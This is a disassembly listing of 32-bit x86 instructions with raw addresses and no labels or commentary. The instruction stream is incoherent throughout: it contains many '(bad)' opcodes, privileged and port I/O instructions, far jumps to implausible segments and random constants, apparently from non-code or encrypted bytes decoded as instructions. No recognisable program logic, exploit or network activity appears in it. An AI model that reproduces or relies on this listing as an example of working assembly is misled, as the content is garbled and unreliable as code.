  425e1e:	lds    edx,FWORD PTR [esi+0x2275bf41]
  425e24:	ret    0x7f86
  425e27:	mov    dl,0xe5
  425e29:	ret    
  425e2a:	ins    BYTE PTR es:[edi],dx
  425e2b:	ret    
  425e2c:	cwde   
  425e2d:	inc    ecx
  425e2e:	dec    edx
  425e2f:	mov    eax,0xa3ade065
  425e34:	push   ss
  425e35:	jbe    0x425de5
  425e37:	test   al,0x83
  425e39:	sbb    DWORD PTR [edi],edx
  425e3b:	es and al,0xfc
  425e3e:	mov    edx,DWORD PTR [ebx*1-0x430b98b2]
  425e45:	fmulp  st(3),st
  425e47:	aad    0x32
  425e49:	cmp    edi,esp
  425e4b:	fidiv  WORD PTR [ebx+0x5f]
  425e4e:	fidiv  WORD PTR [eax+0x1f]
  425e51:	mov    eax,fs
  425e53:	out    0x4e,al
  425e55:	popa   
  425e56:	inc    ebp
  425e57:	pop    ds
  425e58:	loop   0x425e48
  425e5a:	dec    esi
  425e5b:	fs (bad) 
  425e5d:	mov    ds:0xd8eeb2b8,al
  425e62:	pusha  
  425e63:	xchg   esi,eax
  425e64:	lahf   
  425e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e67:	sub    ebx,DWORD PTR [edx+0x50]
  425e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e6b:	ret    
  425e6c:	mov    esp,0x61c3750e
  425e71:	stos   BYTE PTR es:[edi],al
  425e72:	cs ror bh,cl
  425e75:	dec    sp
  425e77:	cmp    BYTE PTR [ebp*2+0x51330c4f],ch
  425e7e:	ret    
  425e7f:	push   edi
  425e80:	fwait
  425e81:	dec    ebp
  425e82:	lods   eax,DWORD PTR ds:[esi]
  425e83:	imul   eax,DWORD PTR [edx+esi*2],0x40
  425e87:	into   
  425e88:	push   esi
  425e89:	dec    edi
  425e8a:	jmp    0xeaebbeb6
  425e8f:	jns    0x425e97
  425e91:	sbb    BYTE PTR [esi],dh
  425e93:	sar    BYTE PTR [eax-0x76],1
  425e96:	sub    al,0xde
  425e98:	adc    BYTE PTR ds:0x73424319,bh
  425e9e:	push   esp
  425e9f:	jmp    DWORD PTR [esi]
  425ea1:	jmp    0xe667:0x1e5a5eb3
  425ea8:	inc    edx
  425ea9:	inc    edx
  425eaa:	ja     0x425e48
  425eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ead:	daa    
  425eae:	adc    DWORD PTR [ebx-0x52],edi
  425eb1:	cmp    eax,0x67f34189
  425eb6:	int3   
  425eb7:	outs   dx,DWORD PTR ds:[esi]
  425eb8:	fucomip st,st(5)
  425eba:	daa    
  425ebb:	jns    0x425f3a
  425ebd:	sub    bl,ah
  425ebf:	pusha  
  425ec0:	add    BYTE PTR [eax-0x18],al
  425ec3:	ins    BYTE PTR es:[edi],dx
  425ec4:	fcomp  DWORD PTR [ecx+ebp*2-0x65f609bc]
  425ecb:	mov    eax,0x230c475e
  425ed0:	shl    esi,cl
  425ed2:	mov    cl,0xb3
  425ed4:	sub    BYTE PTR [esi+0x51cd86ea],0xd6
  425edb:	leave  
  425edc:	xchg   edx,eax
  425edd:	and    eax,0xba78a136
  425ee2:	push   edi
  425ee3:	inc    eax
  425ee4:	mov    ebx,0x815299c
  425ee9:	sbb    al,BYTE PTR [edx-0x21a97e36]
  425eef:	dec    edx
  425ef0:	bound  edx,QWORD PTR cs:[edx-0x3738905c]
  425ef7:	es and al,0x6d
  425efa:	mov    al,ds:0xaf9cad43
  425eff:	sar    DWORD PTR [esi+0x73d74724],cl
  425f05:	lods   eax,DWORD PTR ds:[esi]
  425f06:	test   al,bl
  425f08:	and    eax,0xeb0ed372
  425f0d:	mov    dl,0xd9
  425f0f:	xor    eax,DWORD PTR [ecx]
  425f11:	lds    eax,FWORD PTR [eax-0xd0307ea]
  425f17:	ds icebp 
  425f19:	jns    0x425f90
  425f1b:	sub    eax,0xf2ae7e95
  425f20:	pusha  
  425f21:	sub    ah,BYTE PTR [eax]
  425f23:	gs scas al,BYTE PTR es:[edi]
  425f25:	adc    esp,DWORD PTR ds:0xbc8a4277
  425f2b:	mov    eax,0xb
	...
  425f38:	add    BYTE PTR [eax],al
  425f3a:	or     dl,BYTE PTR [edx-0x3c684]
  425f40:	dec    edi
  425f41:	mov    bl,0x9
  425f43:	sub    al,0x0
  425f45:	sub    edi,DWORD PTR [edi]
  425f47:	addr16 mov ebx,0x1d6363b
  425f4d:	add    bl,bh
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [ebx-0x1de6ecad],dh
  425f57:	push   ebx
  425f58:	push   es
  425f59:	cdq    
  425f5a:	cld    
  425f5b:	mov    edx,0xf414efbb
  425f60:	out    0xed,al
  425f62:	mov    BYTE PTR ds:0x983fac16,dl
  425f68:	xor    BYTE PTR [ecx+0x73b47c43],cl
  425f6e:	cld    
  425f6f:	scas   eax,DWORD PTR es:[edi]
  425f70:	(bad)  
  425f71:	fsubrp st(4),st
  425f73:	in     eax,0xc3
  425f75:	imul   ecx,DWORD PTR es:[esi],0x56
  425f79:	ds mov ebx,0x8ea55cb4
  425f7f:	ja     0x425f41
  425f81:	jecxz  0x425fa0
  425f83:	mov    ebx,esp
  425f85:	mov    ebx,DWORD PTR [esi-0x38]
  425f88:	shl    BYTE PTR [edx+0x7bf7cf86],0x2e
  425f8f:	daa    
  425f90:	aas    
  425f91:	sahf   
  425f92:	daa    
  425f93:	add    esi,DWORD PTR [edi-0x7c]
  425f96:	add    al,0x36
  425f98:	stos   DWORD PTR es:[edi],eax
  425f99:	xor    BYTE PTR [eax-0x37febfa2],dh
  425f9f:	or     edi,DWORD PTR [ebx+edi*8]
  425fa2:	test   al,0x6d
  425fa4:	mov    ch,0xc8
  425fa6:	fadd   st,st(6)
  425fa8:	scas   eax,DWORD PTR es:[edi]
  425fa9:	mov    eax,ds:0xdc97b165
  425fae:	mov    ebp,DWORD PTR [ecx-0x21]
  425fb1:	adc    DWORD PTR [edi-0x47e91883],esi
  425fb7:	das    
  425fb8:	mov    eax,ds:0x415b6506
  425fbd:	aaa    
  425fbe:	(bad)  
  425fbf:	shl    dl,1
  425fc1:	test   eax,0x6bb11a2
  425fc6:	cmp    ecx,DWORD PTR [eax-0x55b387ca]
  425fcc:	mov    bl,0x28
  425fce:	pop    edi
  425fcf:	sbb    eax,0x5b82c114
  425fd4:	adc    ch,BYTE PTR ds:0x8cddfd05
  425fda:	(bad)  
  425fdb:	xchg   ebp,eax
  425fdc:	push   DWORD PTR [ecx-0x3e]
  425fdf:	ds aad 0x2f
  425fe2:	test   al,0xa8
  425fe4:	cmp    dh,0xb2
  425fe7:	cmp    eax,0xb9564713
  425fec:	mov    ebx,0x1745e955
  425ff1:	scas   al,BYTE PTR es:[edi]
  425ff2:	push   esp
  425ff3:	pushf  
  425ff4:	(bad)
  425ff9:	cs in  al,dx
  425ffb:	mov    eax,0xe7080f66
  426000:	xchg   edi,eax
  426001:	sbb    al,0x20
  426003:	pop    ebp
  426004:	mov    ecx,0xb92e30c9
  426009:	outs   dx,BYTE PTR ds:[esi]
  42600a:	arpl   ax,dx
  42600c:	out    dx,al
  42600d:	jle    0x426001
  42600f:	imul   DWORD PTR [edx]
  426011:	xchg   esi,eax
  426012:	or     dl,ah
  426014:	inc    BYTE PTR [edi+0x5d]
  426017:	sub    DWORD PTR [ebx+0x7e],ebx
  42601a:	pop    esp
  42601b:	fst    DWORD PTR [ebp-0x3d45c9c3]
  426021:	in     al,dx
  426022:	dec    eax
  426023:	fistp  DWORD PTR [ecx+ebp*1-0x56]
  426027:	add    edi,DWORD PTR [edi+0x46]
  42602a:	xor    bh,BYTE PTR [edx-0x2c]
  42602d:	pop    esi
  42602e:	arpl   WORD PTR [ebx],cx
  426030:	lock xor BYTE PTR [eax],ch
  426033:	fistp  DWORD PTR [ecx]
  426035:	xchg   BYTE PTR ds:0xc21fd6c,ch
  42603b:	dec    ebp
  42603c:	inc    ebp
  42603d:	xchg   edi,eax
  42603e:	xchg   al,dl
  426040:	sub    eax,0x5ad2f226
  426045:	not    DWORD PTR [esi]
  426047:	mov    bh,0xdd
  426049:	pop    ds
  42604a:	pop    ds
  42604b:	retf   
  42604c:	sub    al,0x7a
  42604e:	jle    0x42601a
  426050:	sub    eax,0x52d6ea66
  426055:	mov    bh,0x20
  426057:	adc    eax,0x3402e2c7
  42605c:	mov    DWORD PTR [ecx],edi
  42605e:	push   es
  42605f:	mov    ebx,0x7f0e96ff
  426064:	push   edi
  426065:	jecxz  0x4260dc
  426067:	iret   
  426068:	inc    edx
  426069:	lea    edi,[edx+0x73b5e102]
  42606f:	adc    DWORD PTR [edi],edx
  426071:	jg     0x426038
  426073:	ja     0x4260e8
  426075:	fbstp  TBYTE PTR [ebx+0xb]
  426078:	jge    0x426066
  42607a:	cli    
  42607b:	xor    DWORD PTR [esi],ebp
  42607d:	dec    ebp
  42607e:	and    eax,DWORD PTR [ecx-0x4931835c]
  426084:	(bad)  
  426085:	and    dh,BYTE PTR [eax+0x1736e55f]
  42608b:	jecxz  0x426060
  42608d:	ins    DWORD PTR es:[edi],dx
  42608e:	inc    eax
  42608f:	adc    BYTE PTR [esi+ebx*8+0x6c],bl
  426093:	mov    edi,0xdd2f6691
  426098:	test   eax,0x9cd90960
  42609d:	cdq    
  42609e:	jl     0x426035
  4260a0:	lods   eax,DWORD PTR ds:[esi]
  4260a1:	movnti DWORD PTR [edi+0x38e47f96],eax
  4260a8:	push   ecx
  4260a9:	out    dx,eax
  4260aa:	dec    edx
  4260ab:	je     0x4260f9
  4260ad:	xchg   edi,eax
  4260ae:	and    al,0x2a
  4260b0:	call   0xa6ee:0xf27ea118
  4260b7:	pop    ecx
  4260b8:	sub    edi,DWORD PTR [edi+0x7b025b5d]
  4260be:	je     0x426084
  4260c0:	jae    0x426081
  4260c2:	ret    
  4260c3:	cmc    
  4260c4:	test   eax,0xeb305b83
  4260c9:	sar    DWORD PTR [edx+0x66],cl
  4260cc:	push   edx
  4260cd:	fadd   st(3),st
  4260cf:	dec    edi
  4260d0:	cmp    bl,BYTE PTR [ebx+edx*2+0x53575629]
  4260d7:	mov    bh,0xce
  4260d9:	fcom   QWORD PTR [edx]
  4260db:	push   eax
  4260dc:	int    0xf3
  4260de:	sub    ebx,DWORD PTR [edi-0x224f4f3]
  4260e4:	jge    0x426131
  4260e6:	cmp    al,0x26
  4260e8:	sub    al,0xc6
  4260ea:	ds ret 
  4260ec:	(bad)  
  4260ed:	and    ebx,DWORD PTR [edi]
  4260ef:	pusha  
  4260f0:	pop    edx
  4260f1:	lods   eax,DWORD PTR ds:[esi]
  4260f2:	imul   ebx,DWORD PTR [eax+ebx*4-0x7816b2ea],0x3d85b00c
  4260fd:	ins    BYTE PTR es:[edi],dx
  4260fe:	data16 sbb cl,dl
  426101:	lahf   
  426102:	icebp  
  426103:	cmp    al,0xef
  426105:	add    BYTE PTR [edx-0x506a9072],dl
  42610b:	mov    gs,WORD PTR ds:0x61eddd99
  426111:	outs   dx,BYTE PTR ds:[esi]
  426112:	retf   0x624f
  426115:	retf   
  426116:	daa    
  426117:	daa    
  426118:	or     al,0xb2
  42611a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42611b:	mov    cl,0x48
  42611d:	sub    BYTE PTR [edx],dl
  42611f:	imul   ebx,DWORD PTR [ecx+ecx*8-0x5a],0x31
  426124:	int3   
  426125:	mov    ds:0xfba0dd58,eax
  42612a:	fsubr  DWORD PTR [ecx+0x2eade5c2]
  426130:	or     BYTE PTR [ebx-0x56],0xaa
  426134:	pop    es
  426135:	cwde   
  426136:	or     eax,0x1609bd2c
  42613b:	sbb    eax,0x92b5b2cd
  426140:	aam    0xae
  426142:	and    al,0xbf
  426144:	inc    ebp
  426145:	fwait
  426146:	stos   DWORD PTR es:[edi],eax
  426147:	jno    0x4260e2
  426149:	scas   eax,DWORD PTR es:[edi]
  42614a:	inc    esi
  42614b:	call   0x0:0x66
	...
  42615a:	ret    
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	xor    eax,0x31b51644
  42616b:	fadd   DWORD PTR [ecx]
  42616d:	add    bl,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [edx+ebp*2+0x7cad7fe8],dl
  426178:	and    BYTE PTR [esi-0x76],bh
  42617b:	sahf   
  42617c:	sbb    edx,DWORD PTR [ebp-0x66]
  42617f:	add    eax,0xe7daf7bc
  426184:	jns    0x426106
  426186:	loop   0x426154
  426188:	out    dx,eax
  426189:	outs   dx,DWORD PTR ds:[esi]
  42618a:	mov    dl,0xb8
  42618c:	inc    esi
  42618d:	mov    ds:0x498c7003,al
  426192:	mov    dh,0xa6
  426194:	adc    BYTE PTR [si-0x7b7f],cl
  426199:	mov    ebp,0x619a33cf
  42619e:	and    DWORD PTR [edi],esp
  4261a0:	cmp    esi,ecx
  4261a2:	iret   
  4261a3:	ret    
  4261a4:	xor    DWORD PTR [bp+di+0x30bd],edx
  4261a9:	xlat   BYTE PTR ds:[ebx]
  4261aa:	add    DWORD PTR [eax+0x14fce2ae],edx
  4261b0:	ret    0x0
  4261b3:	outs   dx,BYTE PTR ds:[esi]
  4261b4:	sub    DWORD PTR [eax],edx
  4261b6:	add    ah,BYTE PTR [ecx+0x1d9a6676]
  4261bc:	cld    
  4261bd:	inc    edi
  4261be:	pushf  
  4261bf:	and    al,0xe0
  4261c1:	jnp    0x426184
  4261c3:	popf   
  4261c4:	sub    al,0x65
  4261c6:	mov    eax,DWORD PTR [esi-0x35e5fad6]
  4261cc:	jmp    0x4261aa
  4261ce:	dec    DWORD PTR ds:0x6d4004ec
  4261d4:	fldcw  WORD PTR [edi+eax*1-0x762728a9]
  4261db:	add    al,0x2b
  4261dd:	neg    BYTE PTR [eax]
  4261df:	cwde   
  4261e0:	inc    esi
  4261e1:	xor    ebp,DWORD PTR [ebx+0x6514551c]
  4261e7:	aam    0x8f
  4261e9:	cmp    eax,0x5ee382cf
  4261ee:	push   ebp
  4261ef:	ins    DWORD PTR es:[edi],dx
  4261f0:	sub    ebx,edx
  4261f2:	mov    eax,0x9e342b47
  4261f7:	mov    BYTE PTR [ecx-0x77],dl
  4261fa:	aas    
  4261fb:	out    dx,al
  4261fc:	(bad)  
  4261fd:	in     al,dx
  4261fe:	inc    ebp
  4261ff:	push   ds
  426200:	hlt    
  426201:	sahf   
  426202:	aad    0x42
  426204:	(bad)
  426208:	shl    DWORD PTR [edx-0x5a100fd1],0x57
  42620f:	lods   eax,DWORD PTR ds:[esi]
  426210:	jecxz  0x42623f
  426212:	sar    BYTE PTR [ebp-0x1082c76a],1
  426218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426219:	fadd   st,st(5)
  42621b:	dec    ebx
  42621c:	lock xchg ebx,eax
  42621e:	sar    DWORD PTR [edi+ecx*8],1
  426221:	enter  0x9e7b,0x86
  426225:	out    dx,eax
  426226:	test   eax,0x9785673f
  42622b:	stos   DWORD PTR es:[edi],eax
  42622c:	addr16 cmc 
  42622e:	xchg   WORD PTR [eax],bp
  426231:	frstor [ecx+0x26]
  426234:	sbb    BYTE PTR [ebp+ebp*2-0xd],ah
  426238:	mov    ecx,0x5c6f3526
  42623d:	jae    0x42624e
  42623f:	and    eax,DWORD PTR [ecx+0x5a]
  426242:	cmc    
  426243:	sbb    bl,BYTE PTR [ecx+0x12]
  426246:	pop    ds
  426247:	mov    ah,0x39
  426249:	loope  0x42625e
  42624b:	mov    ecx,edx
  42624d:	enter  0xaa53,0x3a
  426251:	clc    
  426252:	push   esp
  426253:	(bad)  
  426254:	and    eax,DWORD PTR [edx-0x49]
  426257:	lds    esi,FWORD PTR [ebx]
  426259:	(bad)  
  42625a:	sahf   
  42625b:	ja     0x4262a1
  42625d:	pop    edi
  42625e:	mov    gs,edi
  426260:	push   0x99fcf65
  426265:	mov    bh,0xb6
  426267:	fsub   st(7),st
  426269:	pop    edi
  42626a:	sub    DWORD PTR [eax-0x631c1ea],eax
  426270:	jno    0x426256
  426272:	jns    0x42621e
  426274:	(bad)  
  426275:	sub    BYTE PTR [edi+0x2ef5c1c],ah
  42627b:	pop    esi
  42627c:	sub    BYTE PTR [ecx],ah
  42627e:	in     eax,dx
  42627f:	add    bh,BYTE PTR [edx-0x58]
  426282:	js     0x426220
  426284:	ins    DWORD PTR es:[edi],dx
  426285:	xor    al,0xcb
  426287:	jo     0x426295
  426289:	(bad)  
  42628a:	sti    
  42628b:	and    al,0x2c
  42628d:	(bad)  
  42628e:	cld    
  42628f:	add    edi,DWORD PTR [eax-0x10]
  426292:	jae    0x42627a
  426294:	int    0xc4
  426296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426297:	xor    eax,0x71b3743e
  42629c:	and    DWORD PTR [ebx+ebx*1+0x2ff9fc2],edi
  4262a3:	popa   
  4262a4:	mov    DWORD PTR [ecx*1-0x64fc029c],0x9def3af8
  4262af:	xor    BYTE PTR [edi],0xb9
  4262b2:	ret    
  4262b3:	dec    esi
  4262b4:	jns    0x426240
  4262b6:	inc    ecx
  4262b7:	pop    ebp
  4262b8:	int    0x3
  4262ba:	nop
  4262bb:	jecxz  0x426305
  4262bd:	push   esi
  4262be:	ja     0x4262da
  4262c0:	scas   al,BYTE PTR es:[edi]
  4262c1:	repnz xchg edi,eax
  4262c3:	pop    edi
  4262c4:	dec    esi
  4262c5:	rcr    DWORD PTR [ebp-0x51502373],1
  4262cb:	in     eax,dx
  4262cc:	pop    es
  4262cd:	cmp    ah,BYTE PTR [esp+edx*4]
  4262d0:	pop    edi
  4262d1:	lahf   
  4262d2:	lahf   
  4262d3:	arpl   WORD PTR [edi],ax
  4262d5:	jecxz  0x4262f7
  4262d7:	sar    BYTE PTR ds:0x120f558,0x39
  4262de:	lahf   
  4262df:	mov    al,ds:0x955b56b5
  4262e4:	push   eax
  4262e5:	outs   dx,DWORD PTR ds:[esi]
  4262e6:	mov    bl,0x66
  4262e8:	jne    0x4262f7
  4262ea:	in     eax,dx
  4262eb:	and    eax,0x2be669cd
  4262f0:	(bad)  
  4262f1:	fxch   st(0)
  4262f3:	push   ebx
  4262f4:	sub    edi,DWORD PTR [ebp-0x6ba0944]
  4262fa:	push   ecx
  4262fb:	or     al,0xb6
  4262fd:	xchg   esi,eax
  4262fe:	inc    edx
  4262ff:	push   ecx
  426300:	inc    ecx
  426301:	cdq    
  426302:	out    dx,al
  426303:	adc    ebp,ebx
  426305:	dec    esi
  426306:	push   ds
  426307:	jle    0x4262b6
  426309:	outs   dx,DWORD PTR ds:[esi]
  42630a:	mov    ebp,0xa217fe75
  42630f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426310:	dec    ecx
  426311:	xchg   esp,eax
  426312:	mov    al,ds:0x55c7502d
  426317:	addr16 pop ebx
  426319:	ror    BYTE PTR [ecx+edi*8+0x48440a3a],1
  426320:	pop    ecx
  426321:	inc    esi
  426322:	jg     0x4262b3
  426324:	mov    ds:0xe30d13d9,al
  426329:	hlt    
  42632a:	aam    0xad
  42632c:	push   ss
  42632d:	mov    cl,0xbf
  42632f:	mov    ebp,0xfb030d6f
  426334:	jae    0x426395
  426336:	sbb    BYTE PTR [edx-0x558bbc41],ah
  42633c:	adc    dl,BYTE PTR [ebp+0x6386d2]
  426342:	sub    eax,0xe9036c49
  426347:	cs push ds
  426349:	pop    ebx
  42634a:	ss mov dh,0xdf
  42634d:	cli    
  42634e:	outs   dx,DWORD PTR ds:[esi]
  42634f:	mov    BYTE PTR [edx-0x6a],dl
  426352:	out    dx,ax
  426354:	shr    bh,cl
  426356:	loop   0x42636e
  426358:	dec    ebx
  426359:	in     al,dx
  42635a:	jb     0x426335
  42635c:	inc    esp
  42635d:	jl     0x4263dc
  42635f:	sbb    ecx,DWORD PTR [eax+ecx*1+0x129bc9a4]
  426366:	cwde   
  426367:	sub    al,0x7e
  426369:	add    al,0x9b
  42636b:	in     eax,dx
  42636c:	repnz add BYTE PTR [eax],al
	...
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	sar    DWORD PTR [edi-0x5a],cl
  426388:	std    
  426389:	dec    ecx
  42638a:	sub    al,0xda
  42638c:	add    DWORD PTR [eax],eax
  42638e:	sti    
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [edx+0x5f4c4881],ah
  426397:	push   ss
  426398:	xchg   edx,eax
  426399:	jno    0x426376
  42639b:	dec    ebp
  42639c:	and    bh,bh
  42639e:	xor    dl,BYTE PTR [edi-0x427cad09]
  4263a4:	inc    ecx
  4263a5:	xchg   ecx,eax
  4263a6:	ds sti 
  4263a8:	pop    ecx
  4263a9:	ss ja  0x42641a
  4263ac:	xchg   ebx,eax
  4263ad:	test   eax,0x31ae50d2
  4263b2:	cmp    DWORD PTR [ebp-0x7f7d9b63],eax
  4263b8:	loope  0x42635a
  4263ba:	ja     0x426426
  4263bc:	mov    cl,0x3f
  4263be:	out    0x35,eax
  4263c0:	bound  edi,QWORD PTR [eax+edx*1+0x75]
  4263c4:	test   edi,edi
  4263c6:	js     0x426368
  4263c8:	iret   
  4263c9:	inc    esp
  4263ca:	nop
  4263cb:	jecxz  0x4263c1
  4263cd:	addr16 popf 
  4263cf:	inc    ecx
  4263d0:	push   esp
  4263d1:	je     0x426356
  4263d3:	ret    0x5b41
  4263d6:	mov    BYTE PTR [edi+ebp*2+0x40],bl
  4263da:	dec    ecx
  4263db:	adc    eax,DWORD PTR [ebp-0x5140eb7f]
  4263e1:	jl     0x4263e4
  4263e3:	jl     0x426430
  4263e5:	push   ss
  4263e6:	xchg   edx,eax
  4263e7:	sti    
  4263e8:	iret   
  4263e9:	push   esp
  4263ea:	xchg   edi,eax
  4263eb:	push   0x62
  4263ed:	jo     0x426452
  4263ef:	sub    eax,0x9ccd19d0
  4263f4:	test   bl,bl
  4263f6:	test   al,0x8f
  4263f8:	jecxz  0x4263a7
  4263fa:	mov    WORD PTR [edi+0x76],ss
  4263fd:	mov    bh,0xb6
  4263ff:	(bad)  
  426400:	jno    0x426474
  426402:	xchg   ecx,eax
  426403:	sar    BYTE PTR [esi+0x6275f280],cl
  426409:	sbb    eax,ebp
  42640b:	mov    ecx,0xe0d32cc3
  426410:	cdq    
  426411:	push   ecx
  426412:	test   BYTE PTR ss:[ebp-0x52],cl
  426416:	aaa    
  426417:	xor    BYTE PTR [ecx],0x42
  42641a:	inc    edi
  42641b:	aaa    
  42641c:	push   esi
  42641d:	or     DWORD PTR [ebp+0x15],ebp
  426420:	out    dx,eax
  426421:	xchg   ebx,eax
  426422:	iret   
  426423:	shr    BYTE PTR [esp+edi*4],0x56
  426427:	jo     0x42643e
  426429:	xor    al,cl
  42642b:	xlat   BYTE PTR ds:[ebx]
  42642c:	(bad)  
  42642d:	pop    esp
  42642e:	aad    0x9c
  426430:	push   eax
  426431:	mov    edi,0x26619108
  426436:	cmc    
  426437:	mov    ch,0xaa
  426439:	add    esi,DWORD PTR [ebx]
  42643b:	not    DWORD PTR [eax]
  42643d:	add    BYTE PTR [ebx],bl
  42643f:	inc    edx
  426440:	popa   
  426441:	xor    eax,0x63cffee
  426446:	add    al,0x74
  426448:	icebp  
  426449:	stos   BYTE PTR es:[edi],al
  42644a:	and    al,BYTE PTR [ebx]
  42644c:	cmp    BYTE PTR [esi],ah
  42644e:	cmp    eax,0x368e72ab
  426453:	mov    bh,0x87
  426455:	ja     0x4263eb
  426457:	xchg   esi,eax
  426458:	ja     0x426432
  42645a:	enter  0xf1ef,0xef
  42645e:	rsm    
  426460:	pop    ebp
  426461:	dec    ecx
  426462:	pop    ebp
  426463:	push   0x1bb76dfe
  426468:	aam    0x17
  42646a:	retf   0xad79
  42646d:	xchg   ecx,eax
  42646e:	add    bh,BYTE PTR [edi]
  426470:	xlat   BYTE PTR ds:[ebx]
  426471:	jmp    0x42642c
  426473:	call   0x2c9ed4a6
  426478:	fild   DWORD PTR [bp+di-0x31]
  42647c:	int3   
  42647d:	call   0x7a6815d2
  426482:	sub    BYTE PTR [ecx-0x26],bh
  426485:	pop    edx
  426486:	ror    esp,1
  426488:	popf   
  426489:	outs   dx,DWORD PTR ds:[esi]
  42648a:	xor    DWORD PTR [eax-0x11],edi
  42648d:	mov    al,0xaa
  42648f:	jle    0x426454
  426491:	push   eax
  426492:	xor    esi,DWORD PTR [edx]
  426494:	lds    ebp,FWORD PTR [edi+0x72]
  426497:	xor    BYTE PTR [edi-0x4563e5ea],0xfb
  42649e:	mov    ds:0xc4f2f73f,al
  4264a3:	cmc    
  4264a4:	(bad)  
  4264a5:	iret   
  4264a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264a7:	div    BYTE PTR [eax]
  4264a9:	or     ah,0xe2
  4264ac:	cmp    eax,ebp
  4264ae:	jo     0x4264e1
  4264b0:	inc    edi
  4264b1:	xor    al,0x65
  4264b3:	xchg   DWORD PTR [edx+0x67],eax
  4264b6:	leave  
  4264b7:	pop    ecx
  4264b8:	fild   WORD PTR [ecx]
  4264ba:	mov    esi,0x41e31329
  4264bf:	cmp    DWORD PTR [edi+0x6d],eax
  4264c2:	out    dx,al
  4264c3:	jbe    0x42647c
  4264c5:	and    eax,0xd5fc4409
  4264ca:	sbb    eax,0x2fcd097c
  4264cf:	mov    BYTE PTR [esi+0x26],bh
  4264d2:	push   ds
  4264d3:	jo     0x42652d
  4264d5:	pop    ss
  4264d6:	sbb    DWORD PTR [ebx],edx
  4264d8:	push   es
  4264d9:	mov    cs,WORD PTR [edi-0x3951f011]
  4264df:	sbb    ecx,edi
  4264e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264e2:	pusha  
  4264e3:	pop    edx
  4264e4:	add    eax,0xc7686842
  4264e9:	xor    DWORD PTR [esi-0x2b],ebp
  4264ec:	push   0xffffffac
  4264ee:	mov    al,0xd4
  4264f0:	inc    edi
  4264f1:	mov    edx,0x18188d8b
  4264f6:	popf   
  4264f7:	shr    eax,1
  4264f9:	add    al,0x6a
  4264fb:	(bad)  
  4264fd:	add    edi,DWORD PTR [ecx-0x2f]
  426500:	xchg   esi,ebx
  426502:	popf   
  426503:	test   eax,0xc3dfda72
  426508:	dec    esi
  426509:	repnz in eax,0x1
  42650c:	(bad)  
  42650d:	jb     0x426564
  42650f:	rcr    BYTE PTR ds:0x67bd9bcf,1
  426515:	in     eax,0x4a
  426517:	jg     0x426581
  426519:	lock in eax,0x42
  42651c:	push   cs
  42651d:	ins    BYTE PTR es:[edi],dx
  42651e:	pop    ebx
  42651f:	and    al,0xbc
  426521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426522:	mov    esp,0x24248b97
  426527:	out    dx,al
  426528:	jno    0x4264e0
  42652a:	xor    eax,0x55afc9f
  42652f:	in     eax,0x8f
  426531:	mov    esp,0x6aed4074
  426536:	mov    ebx,0x6a43df46
  42653b:	push   ds
  42653c:	xchg   ebp,eax
  42653d:	fs in  al,0x4f
  426540:	inc    ebp
  426541:	out    dx,eax
  426542:	aad    0xf1
  426544:	inc    esi
  426545:	fsincos 
  426547:	out    dx,eax
  426548:	inc    BYTE PTR [ebx+0x3cb8e25a]
  42654e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42654f:	mov    ah,0x2
  426551:	adc    eax,0x633397a8
  426556:	or     bl,BYTE PTR [edi+ecx*2]
  426559:	jecxz  0x42655a
  42655b:	test   al,0x3b
  42655d:	fbstp  TBYTE PTR [edx]
  42655f:	jmp    0xc1d3cdc5
  426564:	push   ecx
  426565:	lea    ebx,[eax+0x7020a699]
  42656b:	jg     0x42656b
  42656d:	test   esp,edi
  42656f:	cmp    ecx,esi
  426571:	push   ebp
  426572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426573:	inc    eax
  426574:	jecxz  0x426592
  426576:	loope  0x4265f3
  426578:	imul   ebx,DWORD PTR [esi+0x1d],0xe2eb3bbc
  42657f:	mov    ebp,0x9d08de41
  426584:	fsubp  st(6),st
  426586:	nop
  426587:	aas    
  426588:	pushf  
  426589:	inc    ebx
  42658a:	outs   dx,BYTE PTR ds:[esi]
  42658b:	or     edx,DWORD PTR [ecx+0x0]
	...
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426584
  4265a7:	xor    al,0x56
  4265a9:	aas    
  4265aa:	daa    
  4265ab:	fadd   QWORD PTR [ecx]
  4265ad:	add    bl,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [ecx],al
  4265b3:	lods   al,BYTE PTR ds:[esi]
  4265b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265b5:	xchg   ebx,eax
  4265b6:	pop    edi
  4265b7:	mov    DWORD PTR [ecx+eiz*2],esp
  4265ba:	jbe    0x4265f2
  4265bc:	pop    edx
  4265bd:	mov    esi,0xfc2d7eee
  4265c2:	sti    
  4265c3:	in     al,dx
  4265c4:	mov    edx,0x3a703878
  4265c9:	push   esp
  4265ca:	mov    dh,0x9d
  4265cc:	popf   
  4265cd:	inc    edx
  4265ce:	push   es
  4265cf:	mov    ds:0xe03a2022,ax
  4265d5:	and    eax,0x16981fc6
  4265da:	cmp    al,BYTE PTR ds:0x35c0e7a2
  4265e0:	jb     0x4265f7
  4265e2:	jle    0x42663a
  4265e4:	fidivr DWORD PTR ds:0x24604161
  4265ea:	lds    eax,FWORD PTR [ecx]
